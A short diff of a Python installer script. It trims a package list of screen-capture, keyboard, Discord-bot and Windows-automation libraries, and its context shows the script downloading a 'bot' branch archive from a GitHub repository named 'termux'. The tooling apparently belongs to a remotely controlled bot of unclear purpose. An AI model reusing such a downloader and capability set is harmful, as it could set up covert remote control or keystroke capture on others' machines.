@@ -6,7 +6,7 @@ import zipfile
 from pathlib import Path
 
 required_packages = [
-    'flask', 'flask-socketio', 'opencv-python-headless', 'numpy', 'mss',
+    'flask', 'flask-socketio', 'numpy', 'mss',
     'pyautogui', 'Pillow', 'nextcord', 'requests',
     'keyboard', 'python-dateutil', 'pywin32', 'pypiwin32'
 ]
@@ -31,6 +31,8 @@ time.sleep(3)
 
 import requests
 import win32com.client
+
+
 
 r = requests.get("https://github.com/noel-create/termux/archive/refs/heads/bot.zip", allow_redirects=True)
 file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'termux-bot.zip')
